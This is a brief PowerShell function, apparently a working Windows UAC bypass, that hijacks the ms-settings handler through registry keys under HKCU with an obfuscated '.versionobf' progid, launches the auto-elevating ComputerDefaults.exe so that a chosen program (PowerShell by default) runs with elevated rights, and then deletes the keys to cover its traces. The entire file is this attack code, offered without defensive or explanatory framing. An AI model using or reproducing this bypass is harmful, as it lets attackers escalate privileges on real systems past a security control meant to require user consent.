function Invoke-BypassComputerDefaults { 
    Param (    
        [String]$program = "powershell.exe"
    )

    New-Item "HKCU:\software\classes\.versionobf\shell\open\command" -Force | Out-Null
    New-ItemProperty "HKCU:\software\classes\.versionobf\shell\open\command" -Name "DelegateExecute" -Value $null -Force | Out-Null 
    Set-ItemProperty "HKCU:\software\classes\.versionobf\shell\open\command" -Name "(default)" -Value "$program" -Force | Out-Null
    
    New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force | Out-Null
    Set-ItemProperty "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".versionobf" -force | Out-Null

    Start-Process "ComputerDefaults.exe"
    Write-Host "Starting the program."
    Start-Sleep -Seconds 7

    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
    Remove-Item "HKCU:\Software\Classes\.versionobf\" -Recurse -Force
}
